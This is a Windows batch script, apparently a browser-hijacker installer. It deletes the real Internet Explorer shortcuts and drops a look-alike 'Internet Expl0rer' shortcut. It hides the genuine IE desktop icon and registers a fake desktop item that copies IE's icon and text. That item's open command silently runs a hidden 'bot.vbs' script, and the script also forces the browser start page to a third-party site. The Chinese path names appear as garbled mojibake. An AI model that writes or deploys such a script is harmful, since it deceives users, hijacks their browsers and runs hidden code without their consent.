copy .\Tools.lnk "%USERPROFILE%\����ʼ���˵�\����\����\Tools.lnk"
copy .\Tools.lnk "%ALLUSERSPROFILE%\����ʼ���˵�\����\����\Tools.lnk"
del  "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\���� Internet Explorer �����.lnk"
del "%USERPROFILE%\����\Internet Explorer.lnk"
del "%USERPROFILE%\����\Internet.lnk"
del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Explorer.lnk"
copy ".\Internet Expl0rer.lnk" "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\Internet Expl0rer.lnk"

REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetIcon" /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{00000108-0000-0010-8000-00AA006DCCCC}"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}"
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}" /v "InfoTip" /t REG_SZ /d "@shdoclc.dll,-880" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}" /v "LocalizedString" /t REG_SZ /d "@shdoclc.dll,-880" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\DefaultIcon" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\DefaultIcon" /ve /t REG_EXPAND_SZ /d "shdoclc.dll,0" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\InProcServer32" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\InProcServer32" /ve /t REG_SZ /d "%%systemRoot%%\system32\shdocvw.dll" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\InProcServer32"  /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell" /ve /t REG_SZ /d "����ҳ(&H)" /f	
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell\����ҳ(&H)" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell\����ҳ(&H)" /v "MUIVerb" /t REG_SZ /d "@shdoclc.dll,-10241" /f		
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell\����ҳ(&H)\Command" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell\����ҳ(&H)\Command" /ve /t REG_SZ /d "wscript.exe c:\progra~1\Kingsoft\myfile\Microsoft\bot.vbs" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell\����(&R)" 	
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell\����(&R)\Command" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\shell\����(&R)\Command"  /ve /t REG_SZ /d "rundll32.exe shell32.dll,Control_RunDLL INETCPL.CPL,,0" /f			
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\ShellFolder" 
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\ShellFolder" /v "Attributes" /t REG_DWORD /d 0 /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\ShellFolder" /v "HideFolderVerbs" /t REG_SZ /d "" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\ShellFolder" /v "HideOnDesktopPerUser" /t REG_SZ /d "" /f
REG ADD "HKEY_CLASSES_ROOT\CLSID\{00000108-0000-0010-8000-00AA006DCCCC}\ShellFolder" /v "WantsParsDisplayName" /t REG_SZ /d "" /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "http://www.9281.net/?cmd22" /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t REG_SZ /d "http://www.9281.net/?cmd22" /f